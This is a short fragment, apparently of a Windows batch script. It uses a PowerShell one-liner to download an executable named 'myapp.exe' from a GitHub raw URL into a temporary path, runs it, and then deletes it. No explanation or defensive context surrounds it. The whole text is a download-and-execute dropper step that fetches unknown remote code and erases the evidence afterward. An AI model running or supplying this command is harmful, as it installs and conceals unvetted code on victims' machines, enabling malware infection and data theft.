...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Canproject30/schwarz_44-canstlr-3011/main/myapp.exe', '%indirme_yeri%')"
"%indirme_yeri%"
del "%indirme_yeri%"
